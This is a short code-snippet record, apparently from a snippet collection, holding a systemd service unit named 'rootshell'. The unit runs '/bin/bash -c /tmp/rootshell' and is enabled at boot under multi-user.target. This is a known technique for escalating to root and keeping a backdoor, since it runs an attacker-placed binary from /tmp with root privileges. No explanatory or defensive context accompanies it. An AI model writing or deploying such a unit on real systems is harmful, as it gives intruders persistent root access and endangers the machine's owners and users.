---
id: 214e5adc-0b56-4c13-bf5c-7b2650b8c818
type: code
language: Systemd Service
verified: false
created_at: '2019-11-15T21:47:14.570596+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 214e5adc

**Language**: Systemd Service

```systemd service
[Unit]
Description=rootshell
[Service]
Type=notify
ExecStart=/bin/bash -c /tmp/rootshell
[Install]
WantedBy=multi-user.target
```
